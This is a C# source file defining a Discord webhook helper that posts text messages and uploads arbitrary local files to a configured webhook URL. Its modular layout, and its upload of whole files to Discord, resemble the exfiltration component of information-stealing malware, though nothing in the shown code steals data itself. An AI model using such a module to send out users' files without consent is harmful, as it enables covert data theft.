using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using static System.Net.Mime.MediaTypeNames;

namespace Nullable.Modules.Network
{
    internal sealed class Discord_Webhook
    {
        public static bool SendMessage(string Message)
        {
            bool status = false;
            try
            {
                var discordValues = new NameValueCollection();

                using (var client = new WebClient())
                {
                    discordValues.Add("username", Config.Username);
                    discordValues.Add("avatar_url", Config.Avatar);
                    discordValues.Add("content", Message);
                    var response = client.UploadValues(Config.Webhook + "?wait=true", discordValues);
                }
                status = true;
            }
            catch (Exception error)
            {
                Modules.Manager.Logger.Log("Discord >> SendMessage exception:\n" + error);
                status = false;
            }
            return status;
        }

        public static bool SendFileWebhook(string filePath)
        {
            bool status = false;
            try
            {
                HttpClient client = new HttpClient();
                MultipartFormDataContent content = new MultipartFormDataContent();
                var filed = File.ReadAllBytes(filePath);
                content.Add(new ByteArrayContent(filed, 0, filed.Length), Path.GetExtension(filePath), filePath);
                client.PostAsync(Config.Webhook, content).Wait();
                client.Dispose();
                status = true;
            }
            catch(Exception ex)
            {
                Modules.Manager.Logger.Log("Discord >> SendMessage exception:\n" + ex.ToString());
                status = false;
            }
            return status;
        }
    }
}
